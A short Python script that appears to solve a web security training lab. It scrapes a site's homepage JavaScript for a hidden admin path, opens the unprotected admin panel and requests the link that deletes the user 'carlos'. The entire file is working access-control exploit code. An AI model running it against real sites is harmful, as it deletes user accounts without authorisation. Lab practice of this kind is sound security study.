import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = input("Please provide a site: ")

# Fallback to homepage parsing
homepage_url = f'https://{site}/'
resp = s.get(homepage_url)
soup = BeautifulSoup(resp.text, 'html.parser')

# Extract hidden admin URI from second <script> tag
script = soup.find_all('script')[1].contents[0]
match_line = [line for line in script.split('\n') if 'admin-' in line]
uri = match_line[0].split("'")[3]

# Visit admin panel
url = f'https://{site}{uri}'
resp = s.get(url)
soup = BeautifulSoup(resp.text, 'html.parser')

# Find link that deletes carlos
carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href', '')]

if carlos_delete_link:
    delete_uri = carlos_delete_link[0]['href']
    s.get(f'https://{site}{delete_uri}')
else:
    print("[!] No delete link for carlos found.")

